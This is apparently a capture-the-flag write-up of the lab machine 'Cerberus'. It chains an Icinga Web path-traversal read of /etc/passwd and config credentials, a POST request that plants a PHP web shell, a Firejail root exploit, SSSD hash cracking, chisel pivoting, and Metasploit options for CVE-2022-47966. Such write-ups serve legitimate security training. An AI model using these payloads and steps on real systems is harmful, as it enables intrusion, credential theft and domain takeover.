# Cerberus

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 10.129.189.80
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-19 11:23 EDT
Nmap scan report for 10.129.189.80
Host is up (0.18s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

We have to add `icinga.cerberus.local` to our `/etc/hosts` file in order to access port 8080.

### Icinga LFI

Visiting port 8080 reveals this login page:

<figure><img src="../../.gitbook/assets/image (1305).png" alt=""><figcaption></figcaption></figure>

A bit of research reveals that Icinga is a network monitoring tool. Default credentials don't work, so we can head straight into a directory scan.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u http://icinga.cerberus.local:8080/icingaweb2 -t 100 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://icinga.cerberus.local:8080/icingaweb2
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/03/19 11:31:59 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 288]
/.htaccess            (Status: 403) [Size: 288]
/0                    (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login]
/About                (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=About]                                                                                       
/Index                (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=Index]                                                                                       
/Health               (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=Health]                                                                                      
/Default              (Status: 500) [Size: 4321]
/Search               (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=Search]                                                                                      
/about                (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=about]                                                                                       
/account              (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=account]                                                                                     
/announcements        (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=announcements]                                                                               
/config               (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=config]                                                                                      
/css                  (Status: 301) [Size: 346] [--> http://icinga.cerberus.local:8080/icingaweb2/css/]                                                                                   
/dashboard            (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=dashboard]                                                                                   
/default              (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=default]                                                                                     
/font                 (Status: 301) [Size: 347] [--> http://icinga.cerberus.local:8080/icingaweb2/font/]                                                                                  
/group                (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=group]                                                                                       
/health               (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=health]                                                                                      
/iframe               (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=iframe]                                                                                      
/img                  (Status: 301) [Size: 346] [--> http://icinga.cerberus.local:8080/icingaweb2/img/]                                                                                   
/index                (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=index]                                                                                       
/js                   (Status: 301) [Size: 345] [--> http://icinga.cerberus.local:8080/icingaweb2/js/]                                                                                    
/layout               (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=layout]                                                                                      
/list                 (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=list]                                                                                        
/navigation           (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=navigation]                                                                                  
/role                 (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=role]                                                                                        
/search               (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=search]
```

Found some interesting directories, but nothing was useful because we didn't have any credentials. Decided to enumerate on possible Icinga2 exploits online, and found some useful directory traversal related exploits.

{% embed url="https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/" %}

We can follow the PoC present on the page, and find that it works!

```
$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts 
127.0.0.1 iceinga.cerberus.local iceinga
127.0.1.1 localhost
172.16.22.1 DC.cerberus.local DC cerberus.local

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
matthew:x:1000:1000:matthew:/home/matthew:/bin/bash
ntp:x:108:113::/nonexistent:/usr/sbin/nologin
sssd:x:109:115:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
nagios:x:110:118::/var/lib/nagios:/usr/sbin/nologin
redis:x:111:119::/var/lib/redis:/usr/sbin/nologin
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
icingadb:x:999:999::/etc/icingadb:/sbin/nologin
```

What was interesting is that, this is a Windows machine but it seems a Linux container is hosting it. Next, we can note that `172.16.22.1` is hosting the DC from the hosts file we read. Next, we can attempt to read some configuration files for this Icinga instance for the authentication or anything at all. The Icinga documentation reveals that there is some stored `/etc/icingaweb2/authentication.ini`.

```
$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/authentication.ini
[icingaweb2]
backend = "db"
resource = "icingaweb2"
```

So there's a backend `db` for this website, and based on the documentation, it's likely a MySQL or PostgreSQL database.

{% embed url="https://icinga.com/docs/icinga-web/latest/doc/04-Resources/" %}

Checking the `resources.ini` file reveals some credentials.

```
$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini
[icingaweb2]
type = "db"
db = "mysql"
host = "localhost"
dbname = "icingaweb2"
username = "matthew"
password = "IcingaWebPassword2023"
use_ssl = "0
```

With these credentials, we can login to the Icinga Web instance!

<figure><img src="../../.gitbook/assets/image (2457).png" alt=""><figcaption></figcaption></figure>

### Icinga as Matthew -> RCE

I looked around, and determined that this was running **Icinga Web 2 Version 2.9.2**, which could be useful later. On the original page that gave us the directory traversal exploit, there was another RCE exploit, but I'm not sure how to exploit it yet.

<figure><img src="../../.gitbook/assets/image (1020).png" alt=""><figcaption></figcaption></figure>

I also found that as `matthew`, we could create new users. Reading the code from the Sonar website, we can see that there's a `/$configDir/ssh/matthew` directory that can store a private key.

```php
public static function beforeAdd(ResourceConfigForm $form)
{
    $configDir = Icinga::app()->getConfigDir();
    $user = $form->getElement('user')->getValue();
    $filePath = $configDir . '/ssh/' . $user; // [1]
    if (! file_exists($filePath)) {
        $file = File::create($filePath, 0600);
    // [...]
    $file->fwrite($form->getElement('private_key')->getValue()); // [2]
```

This, combined with the RCE exploit above is a clear attack vector. We need to generate an SSH key and upload it (somehow) with the malicious path containing a reverse shell.

First we need to change the `global_module_path` to `/dev` as per the PoC. This can be done in `/config/general`.

<figure><img src="../../.gitbook/assets/image (2095).png" alt=""><figcaption></figcaption></figure>

Then, we can quickly enable the `shm` module in `/config/moduleenable`.

<figure><img src="../../.gitbook/assets/image (919).png" alt=""><figcaption></figcaption></figure>

Afterwards, we need to create a new resource with a private SSH key and upload it. Thsi can be done through `/config/resource` and adding resources for SSH Identities. Afterwards, we can simply send another request with our exploit:

{% code overflow="wrap" %}
```http
POST /icingaweb2/config/createresource HTTP/1.1
Host: icinga.cerberus.local:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Icinga-Accept: text/html
X-Icinga-Container: col2
X-Icinga-WindowId: jaevlhxwkugs_fgnrls
X-Requested-With: XMLHttpRequest
Content-Length: 287
Origin: http://icinga.cerberus.local:8080
Connection: close
Referer: http://icinga.cerberus.local:8080/icingaweb2/config/resource
Cookie: Icingaweb2=tbt6c7vhlitggtddqjs9911s4v; icingaweb2-session=1679242760; icingaweb2-tzo=-14400-1

type=ssh&name=notakey&user=.../../../../../../../dev/shm/shell.php&private_key=file:///etc/icingaweb2/ssh/test\x00<?php+system($_REQUEST['cmd']);?>&formUID=form_config_resource&CSRFToken=287102571%7Cfe7a12539b6a50fd04400ed33c28c9cd4db0ae08f0d2333067009010bd9c1861&btn_submit=Save+Changes
```
{% endcode %}

Visting the URL below would give us RCE!

<figure><img src="../../.gitbook/assets/image (1059).png" alt=""><figcaption></figcaption></figure>

With this, we can get a reverse shell.

<figure><img src="../../.gitbook/assets/image (3258).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

I ran LinPEAS on the machine to enumerate for me. We can find some ports that are open:

<figure><img src="../../.gitbook/assets/image (3302).png" alt=""><figcaption></figcaption></figure>

The MySQL database has nothing of interest. Port 80 was hosting nothing as well.&#x20;

### Firejail RCE

For SUID binaries, there were two that I didn't usually see:

<figure><img src="../../.gitbook/assets/image (3824).png" alt=""><figcaption></figcaption></figure>

We can check its version:

```
www-data@icinga:/etc$ firejail --version
firejail version 0.9.68rc1
```

This version is vulnerable to some RCE exploits, and since it is a SUID binary, we can use this to get to root. We can find a PoC on this website at the bottom of the page:

{% embed url="https://www.openwall.com/lists/oss-security/2022/06/08/10" %}

{% code overflow="wrap" %}
```
www-data@icinga:/tmp$ chmod +x firejail.py 
www-data@icinga:/tmp$ ./firejail.py 
You can now run 'firejail --join=1407' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```
{% endcode %}

We have to repeat the RCE exploit that we did previously to make this work. Then, we can run the command and be able to become root. **Take note we can just run `su -` for this to work.**

<figure><img src="../../.gitbook/assets/image (792).png" alt=""><figcaption></figcaption></figure>

Great! Now we have access as root on the Linux docker.&#x20;

## Docker Escape

Now that we had root user access on the container, we can enumerate the machine further. I spent a LOT of time looking around this machine. Checking the `/opt` directory, it seems we can view some Windows files:

```
root@icinga:/opt# ls
microsoft
root@icinga:/opt# ls -la
total 12
drwxr-xr-x  3 root root 4096 Jan 23 18:24 .
drwxr-xr-x 18 root root 4096 Jan 23 18:22 ..
drwxr-xr-x  3 root root 4096 Jan 23 18:24 microsoft
root@icinga:/opt# cd microsoft/
root@icinga:/opt/microsoft# ls -la
total 12
drwxr-xr-x 3 root root 4096 Jan 23 18:24 .
drwxr-xr-x 3 root root 4096 Jan 23 18:24 ..
drwxr-xr-x 3 root root 4096 Jan 23 18:24 powershell
root@icinga:/opt/microsoft# cd powershell/
root@icinga:/opt/microsoft/powershell# ls -la
total 32
drwxr-xr-x  3 root root  4096 Jan 23 18:24 .
drwxr-xr-x  3 root root  4096 Jan 23 18:24 ..
drwxr-xr-x 20 root root 24576 Jan 23 18:26 7
root@icinga:/opt/microsoft/powershell# cd 7
root@icinga:/opt/microsoft/powershell/7# ls -la
total 182788
drwxr-xr-x 20 root root    24576 Jan 23 18:26 .
drwxr-xr-x  3 root root     4096 Jan 23 18:24 ..
-rw-r--r--  1 root root     1074 Nov 23 03:26 LICENSE.txt
-rw-r--r--  1 root root  1348536 Nov 23 04:01 Markdig.Signed.dll
<TRUNCATED>
```

### Credentials

We must remember that this machine is joined via to a domain somehow. I googled about credentials being left behind in the machine, and found this gem:

{% embed url="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sssd-introduction" %}

So `sssd` is a method of which Linux machines can store credentials. This is in-line with a certain `createdump` file I found in `/opt/microsoft/powershell/7`, which was a binary with some Red Hat data.

<figure><img src="../../.gitbook/assets/image (1827).png" alt=""><figcaption></figcaption></figure>

We can enumerate the `/var/lib/sss` directory to see if we can find anything useful. There's a `db` folder:

```
root@icinga:/var/lib/sss/db# ls -la
total 5036
drwx------  2 root root    4096 Mar  2 12:33 .
drwxr-xr-x 10 root root    4096 Jan 22 18:12 ..
-rw-r--r--  1 root root 1286144 Mar 22 13:23 cache_cerberus.local.ldb
-rw-------  1 root root    2715 Mar  2 12:33 ccache_CERBERUS.LOCAL
-rw-------  1 root root 1286144 Mar 22 13:23 config.ldb
-rw-------  1 root root 1286144 Jan 22 18:32 sssd.ldb
-rw-r--r--  1 root root 1286144 Mar  1 12:07 timestamps_cerberus.local.ldb
```

When `strings` is used to view the `cache_cerberus.local.ldb` file, we can find a hashed password for `matthew`.&#x20;

<figure><img src="../../.gitbook/assets/image (2529).png" alt=""><figcaption></figcaption></figure>

This hash can be cracked instantly:

<figure><img src="../../.gitbook/assets/image (2733).png" alt=""><figcaption></figcaption></figure>

### Pivoting

Now we have credentials, but we don't have an avenue to use them. The `nmap` scan earlier only picked up on port 8080 being detectable from this machine. So, it is likely the next step is **port forwarding**. I downloaded the `nmap` binary onto the machine, and started to scan the internal networks.

Viewing the `/etc/hosts` file gave me the IP address of the DC:

```
root@icinga:/tmp# cat /etc/hosts
127.0.0.1 iceinga.cerberus.local iceinga
127.0.1.1 localhost
172.16.22.1 DC.cerberus.local DC cerberus.local
```

I did a quick scan and found that the machine had port 5985 for WinRM open, meaning `evil-winrm` can be used to log in as `matthew`.&#x20;

```
root@icinga:/tmp# ./nmap_binary -p 1-10000 172.16.22.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-22 14:10 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Stats: 0:01:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 44.80% done; ETC: 14:14 (0:01:52 remaining)
Stats: 0:02:51 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 84.80% done; ETC: 14:14 (0:00:31 remaining)
Nmap scan report for DC.cerberus.local (172.16.22.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.12s latency).
Not shown: 9999 filtered ports
PORT     STATE SERVICE
5985/tcp open  unknown
MAC Address: 00:15:5D:5F:E8:00 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 186.05 seconds
```

We can port forward using `chisel`.&#x20;

```bash
# on my machine
chisel server -p 9001 --reverse
# on icinga
./chisel client 10.10.16.18:9001 R:5985:172.16.22.1:5985
```

Then we can `evil-winrm` in.

<figure><img src="../../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

We can now capture the user flag!

## AD Escalation

Now that we are in the main Windows machine, we can try to become the domain admin / administrator of the machine. Looking at the `C:\Program Files (x86)` directory, we can find a `ManageEngine` directory

```
*Evil-WinRM* PS C:\Program Files (x86)> ls


    Directory: C:\Program Files (x86)


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:28 AM                Common Files
d-----        3/22/2023   7:09 AM                Google
d-----         9/7/2022   4:34 AM                Internet Explorer
d-----        1/29/2023  11:12 AM                ManageEngine
d-----        9/15/2018  12:19 AM                Microsoft.NET
d-----        8/24/2021   7:47 AM                Windows Defender
d-----        8/24/2021   7:47 AM                Windows Mail
d-----         9/7/2022   4:34 AM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        8/24/2021   7:47 AM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                WindowsPowerShell
```

This directory contained files for `ADSelfService Plus`. This was an AD service used for SSO and Password Management on the domain.&#x20;

### ADServicePlus Enumeration

From what I can gather, this service opens a port and runs a web application. We can verify this using `netstat -an`:

```
*Evil-WinRM* PS C:\Program Files (x86)\ManageEngine\ADSelfService Plus> netstat -an

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:808            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:1500           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:1501           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:2179           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:8888           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:9003           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:9251           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING
```

Port 9003 is the one we want after some testing. Port 8888 redirects me there for some reason and the rest of the ports weren't interesting. Let's try port forwarding to view the services running on these ports. We would have to port forward again using `chisel` to do this.&#x20;

```bash
# on my machine, with proxychains set up to port 1080
./chisel server -p 9003  --reverse
# on icinga WINDOWS
./chisel client 10.10.16.18:9003 R:1080:socks
```

Then we need to add `DC.cerberus.local` with the IP of `172.16.22.1` to our `/etc/hosts` file before we can visit this in Firefox with `proxychains`. Very similar to NUS's, interestingly.&#x20;

<figure><img src="../../.gitbook/assets/image (1587).png" alt=""><figcaption></figcaption></figure>

We can login with `matthew@cerberus.local` and the password we found earlier. This does nothing for us, however. All it does is provide a URL with a token appended at the back:&#x20;

```
https://dc:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
```

Not sure what to do with this though.

### CVE-2022-47966

One thing I've learnt with the newer HTB machines is that **they always use newer exploits available**. As such, we can try to find a new exploit for this software and try it:

{% embed url="https://www.cvedetails.com/vulnerability-list/vendor_id-9841/product_id-20523/Zohocorp-Manageengine-Adselfservice-Plus.html" %}

The first was CVE-2022-47966, which was an Exec Code exploit. It seems to affect a huge number of versions based on reading some articles, so it might work. This particular exploit requires SAML SSO to be enabled, and it is on this website as the following link is visited when we first load the page before logging in:

{% code overflow="wrap" %}
```
https://dc.cerberus.local/adfs/ls/?SAMLRequest=pVNNj9owFLz3V1i%2Bk8RJgMQirCh0VSS2jSDbQy%2BV47ywlhKb2g7L%2Fvt1%2BNjSqqVSe7Jkz3tv3sx4cndoG7QHbYSSGSZegBFIriohtxl%2BLO4HCb6bvpsY1jbhjs46%2ByTX8L0DY9HMGNDW1c2VNF0LegN6Lzg8rlcZfrJ2Z6jvL%2BY0DYfE7xus1FZIfzRmSUUCMkqDOAgrPmKjcRyXSc0TNuaMMF4nSRnWGC3cFCGZPVK7NKy4x0GXoDvjNYqzxmdVbfzG%2BBgtFxn%2BFg3LIIySgPGSJBGJ47SuU0KSmI1IlJbgYMZ0sJTGMmkzHDr0IIgGYViQmMZjGg69NBp%2FxSjXyiqumvdCnvTotKSKGWGoZC0YajndzB5WNPQCWp5Ahn4sinyQf94UxwZ7UYH%2B5NAZfmCSbeGDdCIAmi020NRnxVDedAajLxcbwt4GZ4w09CT87dG7M088PflEjwtqdK90y%2Bzt2v5GVIP6CKUgrbAvP82%2BXc4uGcDT%2F3d84l%2FTn15C16u3XOSqEfwFzZpGPc81MOsUtbpzdv5tTeKRX9bspNkBF7WACvtvc865huqYchdqCweL5qrdMS1M7wscGLdvKl%2FD5o1TYg31Pyl3E8Yp73u769wdz0pXfSyBO56FZm4Rpe1FuN8xmp4f%2F7Dfj%2Bfrvz19BQ%3D%3D&RelayState=aHR0cHM6Ly9EQzo5MjUxL3NhbWxMb2dpbi9MT0dJTl9BVVRI
```
{% endcode %}

I took a hint from the HTB forum, and it seems `metasploit` is the easiest way to exploit this. So let's boot `msfconsole` to exploit it. First, we can find the new module for this:

{% embed url="https://github.com/rapid7/metasploit-framework/pull/17527" %}

Either import the module or we can update `metasploit` and access the module via `use exploit/multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966`. Looking at the options, the main ones to set are **GUID and ISSUER\_URL.** The GUID must be the string we got after logging in. Based on the definition of the issuer URL, we can find it quite easily by googling SAML SSO identity provider. We can set the options below:

```
set RHOSTS 172.16.22.1
set LHOST tun0
set SSL true
set RPORT 9251
set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
set ISSUER_URL http://dc.cerberus.local/adfs/services/trust
```

When executed, we would get a meterpreter shell as the SYSTEM user.

<figure><img src="../../.gitbook/assets/image (1737).png" alt=""><figcaption></figcaption></figure>

Using hints from the forum were really helpful, because I dislike using Metasploit and would have naturally avoided it.

## Beyond Root

I feel that I should delve into a bit on how the exploit works since Metasploit is a black box after all. This vulnerability arises from an outdated dependency on Apache Santuario, which it self is vulnerable to RCE dating back to 2008.

I would try to explain the exploit, but the report itself does a way better job than I ever can. Check it out!

{% embed url="https://blog.viettelcybersecurity.com/saml-show-stopper/" %}
